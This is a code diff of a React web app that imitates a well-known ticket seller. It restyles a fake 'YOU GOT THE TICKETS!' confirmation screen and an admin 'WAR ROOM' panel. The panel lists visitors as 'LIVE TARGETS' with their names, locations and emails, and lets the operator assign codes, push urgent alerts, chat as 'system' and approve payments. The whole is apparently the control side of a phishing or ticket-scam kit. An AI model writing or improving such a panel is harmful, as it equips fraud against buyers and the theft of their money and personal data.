-      <div className={`bg-white w-full max-w-md rounded-[50px] p-10 text-center shadow-[0_50px_100px_rgba(0,0,0,0.3)] transition-all duration-1000 transform ${showPrize ? 'scale-100 translate-y-0 opacity-100' : 'scale-75 translate-y-20 opacity-0'}`}>
-         <div className="w-24 h-24 bg-green-500 rounded-[30px] flex items-center justify-center mx-auto mb-8 shadow-2xl shadow-green-500/40 animate-bounce">
-           <CheckCircle className="text-white w-12 h-12 stroke-[4]" />
+      <div className={`bg-white w-full max-w-lg rounded-[60px] p-12 text-center shadow-[0_80px_150px_rgba(0,0,0,0.4)] transition-all duration-1000 transform ${showPrize ? 'scale-100 translate-y-0 opacity-100' : 'scale-75 translate-y-40 opacity-0'}`}>
+         <div className="w-28 h-28 bg-green-500 rounded-[40px] flex items-center justify-center mx-auto mb-10 shadow-[0_20px_50px_rgba(34,197,94,0.4)] animate-bounce">
+           <CheckCircle className="text-white w-14 h-14 stroke-[4]" />
          </div>
-         
-         <h1 className="text-4xl font-black text-gray-900 leading-tight mb-4 tracking-tighter uppercase">Tickets Confirmed!</h1>
-         <p className="text-gray-400 font-bold mb-10 text-sm uppercase tracking-widest">See you at {event?.artist}</p>
-         
-         <div className="bg-gray-50 rounded-[30px] p-8 border-2 border-dashed border-gray-200 mb-10 space-y-4">
-            <div className="flex flex-col items-center gap-2">
-               <Ticket className="w-10 h-10 text-[#026cdf]" />
-               <span className="text-[10px] font-black text-gray-300 uppercase tracking-[0.2em]">Total Transaction</span>
-               <span className="text-5xl font-black text-gray-900 tracking-tighter">${total}</span>
-            </div>
-            <p className="text-[9px] text-gray-400 leading-relaxed font-bold">A confirmation email has been sent to your registered address. Present your digital QR code at the venue entrance.</p>
+         <h1 className="text-5xl font-black text-gray-900 leading-tight mb-4 tracking-tighter uppercase italic">YOU GOT THE TICKETS!</h1>
+         <p className="text-gray-400 font-black mb-12 text-xs uppercase tracking-[0.3em]">Official Mobile Tickets Secured</p>
+         <div className="bg-gray-50 rounded-[45px] p-10 border-4 border-dashed border-gray-100 mb-12 space-y-4 shadow-inner">
+            <Ticket className="w-12 h-12 text-[#026cdf] mx-auto mb-2" />
+            <p className="text-[10px] text-gray-300 font-black uppercase tracking-[0.4em]">Transaction Approved</p>
+            <p className="text-6xl font-black text-gray-900 tracking-tighter">${total}</p>
          </div>
-
-         <button onClick={onHome} className="w-full bg-[#1f262d] text-white py-5 rounded-[24px] font-black text-lg hover:bg-black transition-all shadow-xl">
-           VIEW MY TICKETS
-         </button>
+         <button onClick={onHome} className="w-full bg-[#1f262d] text-white py-6 rounded-[30px] font-black text-xl hover:bg-black transition-all shadow-2xl active:scale-95 uppercase tracking-widest italic">VIEW MY MOBILE TICKETS</button>
       </div>
     </div>
   );
 }
 
-function AdminDashboard({ isLoggedIn, setLoggedIn, sessions, updateSession, globalSettings, updateGlobalSettings, sendChatMessage, onExit }) {
-  const [e, setE] = useState(''); const [p, setP] = useState('');
+function AdminDashboard({ user, pass, isLoggedIn, setLoggedIn, sessions, updateSession, globalSettings, updateGlobalSettings, sendChatMessage, onExit }) {
+  const [uInput, setUInput] = useState(''); const [pInput, setPInput] = useState('');
   const [config, setConfig] = useState(globalSettings);
 
   const sendNotification = async (sid, text) => {
@@ -471,57 +503,77 @@ function AdminDashboard({ isLoggedIn, setLoggedIn, sessions, updateSession, glob
     }
   };
 
-  if(!isLoggedIn) return <div className="min-h-screen bg-[#1f262d] flex items-center justify-center"><div className="bg-white p-10 rounded-[40px] w-96 shadow-2xl space-y-6"><h2 className="text-2xl font-black text-center uppercase tracking-widest">Admin Access</h2><input placeholder="Admin ID" className="border-2 w-full p-4 rounded-2xl outline-none focus:border-[#026cdf]" value={e} onChange={ev=>setE(ev.target.value)}/><input type="password" placeholder="Passkey" className="border-2 w-full p-4 rounded-2xl outline-none focus:border-[#026cdf]" value={p} onChange={ev=>setP(ev.target.value)}/><button onClick={()=>{if(e==='admin'&&p==='admin')setLoggedIn(true)}} className="bg-[#026cdf] text-white w-full py-4 rounded-2xl font-black shadow-xl">ACCESS SYSTEM</button></div></div>;
+  if(!isLoggedIn) return (
+    <div className="min-h-screen bg-[#1f262d] flex items-center justify-center p-6">
+      <div className="bg-white p-12 rounded-[55px] w-full max-w-sm shadow-2xl space-y-10 animate-slideUp">
+        <div className="text-center space-y-2">
+           <LogIn className="w-12 h-12 text-[#026cdf] mx-auto mb-4" />
+           <h2 className="text-3xl font-black uppercase tracking-widest leading-none">Command Center</h2>
+           <p className="text-[10px] text-gray-400 font-bold uppercase tracking-[0.2em]">Authorized Access Only</p>
+        </div>
+        <div className="space-y-4">
+           <input placeholder="Username" className="border-2 w-full p-5 rounded-3xl outline-none focus:border-[#026cdf] font-bold" value={uInput} onChange={ev=>setUInput(ev.target.value)}/>
+           <input type="password" placeholder="Access Key" className="border-2 w-full p-5 rounded-3xl outline-none focus:border-[#026cdf] font-bold" value={pInput} onChange={ev=>setPInput(ev.target.value)}/>
+           <button onClick={()=>{if(uInput===user && pInput===pass)setLoggedIn(true)}} className="bg-[#026cdf] text-white w-full py-5 rounded-3xl font-black shadow-2xl hover:bg-blue-700 transition-all uppercase tracking-widest mt-4">Login System</button>
+        </div>
+      </div>
+    </div>
+  );
   
   return (
-    <div className="min-h-screen bg-[#f1f5f9] p-4 md:p-8">
-      <div className="max-w-7xl mx-auto space-y-8">
-        <div className="flex justify-between items-center"><h1 className="text-3xl font-black uppercase tracking-tighter flex items-center gap-2"><div className="w-3 h-3 bg-green-500 rounded-full animate-pulse" /> WAR ROOM</h1><button onClick={onExit} className="bg-red-600 text-white px-6 py-2 rounded-full font-bold text-xs">DISCONNECT</button></div>
+    <div className="min-h-screen bg-[#f1f5f9] p-4 md:p-10">
+      <div className="max-w-7xl mx-auto space-y-10">
+        <div className="flex justify-between items-center"><h1 className="text-4xl font-black uppercase tracking-tighter flex items-center gap-4 italic"><div className="w-4 h-4 bg-green-500 rounded-full animate-pulse shadow-[0_0_20px_#22c55e]" /> WAR ROOM</h1><button onClick={onExit} className="bg-red-600 text-white px-8 py-3 rounded-full font-black text-xs uppercase tracking-widest shadow-xl">TERMINATE CONNECTION</button></div>
         
-        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
-          <div className="bg-white p-8 rounded-[40px] shadow-sm border space-y-6 h-fit">
-            <h3 className="font-black text-lg uppercase flex items-center gap-2"><DollarSign className="w-5 h-5 text-green-600" /> Site Controls</h3>
-            <div className="space-y-4">
-               <div><label className="text-[10px] font-black text-gray-400 block mb-2 uppercase">Global Ticket Price</label><input type="number" className="w-full border-2 p-3 rounded-xl font-bold" value={config.price} onChange={ev=>setConfig({...config, price: Number(ev.target.value)})}/></div>
-               <div><label className="text-[10px] font-black text-gray-400 block mb-2 uppercase">Presale Access Code</label><input className="w-full border-2 p-3 rounded-xl font-bold" value={config.presaleCode} onChange={ev=>setConfig({...config, presaleCode: ev.target.value})}/></div>
-               <div><label className="text-[10px] font-black text-gray-400 block mb-2 uppercase">Global BG Image URL</label><input className="w-full border-2 p-3 rounded-xl text-xs" value={config.bgImage} onChange={ev=>setConfig({...config, bgImage: ev.target.value})}/></div>
-               <button onClick={()=>updateGlobalSettings(config)} className="w-full bg-[#026cdf] text-white py-4 rounded-2xl font-black shadow-lg">DEPLOY CHANGES</button>
+        <div className="grid grid-cols-1 lg:grid-cols-3 gap-10">
+          <div className="bg-white p-10 rounded-[50px] shadow-2xl border-4 border-white space-y-8 h-fit">
+            <h3 className="font-black text-xl uppercase flex items-center gap-3 italic"><DollarSign className="w-6 h-6 text-green-600" /> System Global</h3>
+            <div className="space-y-6">
+               <div><label className="text-[11px] font-black text-gray-400 block mb-3 uppercase tracking-widest">Base Seat Price ($)</label><input type="number" className="w-full border-2 p-4 rounded-2xl font-black text-xl text-blue-600" value={config.price} onChange={ev=>setConfig({...config, price: Number(ev.target.value)})}/></div>
+               <div><label className="text-[11px] font-black text-gray-400 block mb-3 uppercase tracking-widest">Master Fan Code</label><input className="w-full border-2 p-4 rounded-2xl font-black uppercase tracking-widest" value={config.presaleCode} onChange={ev=>setConfig({...config, presaleCode: ev.target.value})}/></div>
+               <div><label className="text-[11px] font-black text-gray-400 block mb-3 uppercase tracking-widest">Global Wallpaper URL</label><input className="w-full border-2 p-4 rounded-2xl text-xs font-medium bg-gray-50" value={config.bgImage} onChange={ev=>setConfig({...config, bgImage: ev.target.value})}/></div>
+               <button onClick={()=>updateGlobalSettings(config)} className="w-full bg-[#026cdf] text-white py-5 rounded-3xl font-black shadow-2xl shadow-blue-500/40 uppercase tracking-widest hover:scale-[1.03] transition-all">SYNC GLOBAL ARTIFACTS</button>
             </div>
           </div>
           
-          <div className="lg:col-span-2 bg-white p-8 rounded-[40px] shadow-sm border space-y-6">
-            <h3 className="font-black text-lg uppercase flex items-center gap-2"><User className="w-5 h-5 text-blue-600" /> Active Sessions ({sessions.length})</h3>
-            <div className="space-y-6 max-h-[700px] overflow-y-auto pr-2">
+          <div className="lg:col-span-2 bg-white p-10 rounded-[50px] shadow-2xl border-4 border-white space-y-10">
+            <h3 className="font-black text-xl uppercase flex items-center gap-3 italic"><User className="w-6 h-6 text-[#026cdf]" /> LIVE TARGETS ({sessions.length})</h3>
+            <div className="space-y-8 max-h-[800px] overflow-y-auto pr-4 scroll-pro">
               {sessions.map(s=>(
-                <div key={s.id} className="bg-gray-50 p-6 rounded-[32px] border-2 border-gray-100 space-y-4">
+                <div key={s.id} className="bg-gray-50 p-8 rounded-[40px] border-2 border-gray-100 space-y-6 group hover:border-[#026cdf]/30 transition-all">
                   <div className="flex justify-between items-start">
-                    <div>
-                      <div className="text-sm font-black text-blue-700">{s.name || 'Anonymous'} <span className="text-gray-400 font-medium">({s.location})</span></div>
+                    <div className="space-y-1">
+                      <div className="text-lg font-black text-blue-800 uppercase italic leading-none">{s.name || 'Visitor Unidentified'}</div>
+                      <div className="text-[11px] text-gray-400 font-black uppercase tracking-widest">{s.location}</div>
                       <div className="text-[10px] text-gray-500 font-bold">{s.email}</div>
                     </div>
-                    <div className="bg-white px-3 py-1 rounded-full text-[10px] font-black text-gray-400 border uppercase">{s.status}</div>
+                    <div className="bg-white px-5 py-2 rounded-full text-[10px] font-black text-[#026cdf] border-2 border-blue-100 uppercase tracking-widest shadow-sm">{s.status}</div>
                   </div>
 
-                  <div className="grid grid-cols-2 gap-4">
-                    <div className="bg-white p-3 rounded-xl border">
-                       <label className="text-[9px] font-black text-gray-400 uppercase block mb-1">Assigned Auth Code</label>
-                       <input className="w-full font-black text-blue-600 text-lg outline-none" placeholder="SET CODE" onBlur={(e) => updateSession(s.id, { userAuthCode: e.target.value })} defaultValue={s.userAuthCode} />
+                  <div className="grid grid-cols-2 gap-6">
+                    <div className="bg-white p-5 rounded-3xl border-2 border-gray-100 shadow-inner">
+                       <label className="text-[9px] font-black text-gray-400 uppercase block mb-2 tracking-widest">Assigned Access Code</label>
+                       <input className="w-full font-black text-[#026cdf] text-3xl outline-none placeholder:text-gray-100" placeholder="XXXX" onBlur={(e) => updateSession(s.id, { userAuthCode: e.target.value })} defaultValue={s.userAuthCode} />
                     </div>
-                    <div className="bg-white p-3 rounded-xl border">
-                       <label className="text-[9px] font-black text-gray-400 uppercase block mb-1">Live Ping (Bell)</label>
+                    <div className="bg-white p-5 rounded-3xl border-2 border-gray-100 shadow-inner">
+                       <label className="text-[9px] font-black text-gray-400 uppercase block mb-2 tracking-widest">Deploy Bell Alert</label>
                        <div className="flex gap-2">
-                          <input className="flex-1 text-[10px] font-bold outline-none" placeholder="MSG" id={`ping-${s.id}`} />
-                          <button onClick={() => sendNotification(s.id, document.getElementById(`ping-${s.id}`).value)} className="bg-red-500 text-white px-2 rounded font-black text-[9px]">PING</button>
+                          <input className="flex-1 text-[11px] font-bold outline-none uppercase placeholder:text-gray-200" placeholder="URGENT MSG..." id={`ping-${s.id}`} />
+                          <button onClick={() => sendNotification(s.id, document.getElementById(`ping-${s.id}`).value)} className="bg-red-600 text-white px-4 rounded-xl font-black text-[10px] shadow-lg shadow-red-500/20 active:scale-90 transition-all">PING</button>
                        </div>
                     </div>
                   </div>
 
-                  <div className="flex gap-2">
-                    <input className="flex-1 bg-white border p-2 rounded-xl text-xs font-medium" placeholder="Chat reply..." onKeyDown={e => { if(e.key==='Enter'){ sendChatMessage(s.id, e.target.value, 'system'); e.target.value='' } }} />
-                    <button onClick={() => updateSession(s.id, {status: 'payment_complete'})} className="bg-green-600 text-white px-4 rounded-xl font-black text-[10px]">SUCCESS</button>
+                  <div className="flex gap-3">
+                    <div className="flex-1 relative">
+                       <input className="w-full bg-white border-2 border-gray-100 p-4 rounded-2xl text-[13px] font-bold outline-none focus:border-[#026cdf] transition-all" placeholder="Direct Reply..." onKeyDown={e => { if(e.key==='Enter'){ sendChatMessage(s.id, e.target.value, 'system'); e.target.value='' } }} />
+                       <Send className="absolute right-4 top-4 w-4 h-4 text-gray-300" />
+                    </div>
+                    <button onClick={() => updateSession(s.id, {status: 'payment_complete'})} className="bg-green-600 text-white px-8 rounded-2xl font-black text-xs uppercase shadow-xl shadow-green-500/20 hover:bg-green-700 active:scale-95 transition-all">APPROVE</button>
                   </div>
                 </div>
               ))}
+              {sessions.length === 0 && <div className="py-20 text-center font-black text-gray-300 uppercase tracking-[0.6em]">No Active Targets Found</div>}
             </div>
           </div>
         </div>
